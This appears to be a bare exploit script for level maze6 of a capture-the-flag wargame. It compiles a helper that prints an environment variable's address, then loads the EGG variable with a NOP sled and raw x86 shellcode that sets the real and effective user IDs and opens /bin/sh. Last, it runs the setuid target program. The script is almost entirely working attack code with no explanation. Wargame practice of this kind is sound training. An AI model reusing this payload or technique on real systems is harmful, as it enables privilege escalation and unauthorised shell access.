#!/bin/bash
mkdir /tmp/ballban_maze6; cd /tmp/ballban_maze6
nano check_env.c
gcc -m32 check_env.c -o check_env

export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 10 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
./check_env EGG # 0xffffddec

/maze/maze6 1 2